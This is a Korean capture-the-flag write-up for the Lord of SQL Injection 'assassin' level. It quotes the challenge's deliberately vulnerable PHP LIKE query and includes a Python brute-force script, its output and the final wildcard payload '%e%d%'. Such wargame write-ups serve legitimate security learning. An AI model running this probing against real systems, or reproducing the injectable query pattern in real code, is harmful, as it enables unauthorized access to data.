---
title: "[Lord of SQL Injection] LoS - assassin 문제풀이"
date: 2018-08-03
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

이번에는 문제 이름이 몬스터 이름이 아니다.
`assassin` 문제인데, 개인적으로 재밌던 문제이다.  

<!--more-->

코드는 다음과 같다.  

```php
----------------------------------------------------------------------
query : select id from prob_assassin where pw like ''
----------------------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
  highlight_file(__FILE__); 
?>
```

필터링이 `'(싱글쿼터)` 딱 한개만 있다.
그리고 `=` 대신에 `like`이 쓰였다.
처음에는 `'`를 우회하는 방법이 있을 거라고 생각 해 이 부분에 초점을 맞추어 문제를 풀어보려 했다.
그런데 아무리 해도 우회를 하는 방법을 찾을수가 없었다.  

그러다 눈에 띈 부분이 왜 `=`가 아니라 `like`을 사용 했을까 였다.
나는 단순히 `=`와 `like`가 동일하다고 생각했는데, 뭔가 다른 점이 있을 것 같았다.
그래서 구글에 `mysql like`이라고 검색을 해봤는데, `%`를 알게 되었다.
`like`을 사용한다면, `%`를 이용 해 특정 문자가 있는 행을 추출할 수 있다.
예를 들어 아래와 같은 쿼리문이 있다고 가정해보자.  

```mysql
select * from user where id like '%a%';
```

이 경우, `%`는 `모든 문자`를 의미하게 된다.
때문에 `%a%`라고 한다면, `a`의 앞뒤로 어떠한 문자가 있는 경우를 말한다.
즉, `man`, `woman` 등은 `a`의 앞뒤로 문자가 있어 조건에 부합하게 된다.
반면 `apple`는 `a`의 앞에 문자가 없기 때문에 조건에 맞지 않는다.

그래서 이 방법을 가지고 `assassin` 문제를 풀기로 했다.
가장 먼저 테스트 한 것은 그냥 `%`만 입력 해 보는 것이었다.
`pw`에 분명 문자가 있을테니, `pw`에 `뭐라도 문자가 있는 행`을 추출 해 보려 했다.
그런데 `Hello guest`가 출력되었다.
아마도 테이블에 `guest`가 `admin`보다 위에 있어 먼저 추출 된 것 같다.
그래서 이번에는 `%a%` 형태로 만들어서 하나하나 테스트 해 보기로 했다.
손으로 하려다가 귀찮아져서 아래와 같이 코드를 구현했다.  

```python
import requests

flag = ""
length = 0

url = "http://los.rubiya.kr/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=%"
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find password"

for i in range(48, 128):
	try:
		query = url + chr(i) + "%"
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"
		continue

	if 'Hello admin' in r.text:
		flag += chr(i)
		print "[+] Found :", flag

print "[+] Found password : ", flag
print "[+] End"
```

그런데 결과가 안나왔다.(눙물...)
그래서 이번에는 `Hello guest`가 출력되는 문자를 찾도록 조건문을 수정 해 다시 테스트 해 보았다.
그 결과 아래와 같은 문자들을 얻을 수 있었다.  

```bash
$ python ex.py 
[+] Start
[+] Find password
[+] Found : 0
[+] Found : 01
[+] Found : 012
[+] Found : 0129
[+] Found : 0129D
[+] Found : 0129DE
[+] Found : 0129DEF
[+] Found : 0129DEF_
[+] Found : 0129DEF_d
[+] Found : 0129DEF_de
[+] Found : 0129DEF_def
[+] Found password :  0129DEF_def
[+] End
```

아마도 테이블에서 `guest`와 `admin`의 `pw`가 같은 문자들로만 이루어져 있고, `guest`가 `admin`보다 위에 있어 `guest`만 출력되는 것 같다.
그래서 저 문자를 적절하게 조합하면 `admin`을 얻을 수 있지 않을까 생각 해, 이것저것 시도 해 보다 보니 아래와 같이 입력했을 때 문제를 풀 수 있었다.  

```plain
?pw=%e%d%
```

---

```php
-------------------------------------------------------------------------------
query : select id from prob_assassin where pw like '%e%d%'
-------------------------------------------------------------------------------

Hello admin
ASSASSIN Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
  highlight_file(__FILE__); 
?>
```

---

```plain
ASSASSIN Clear!!
```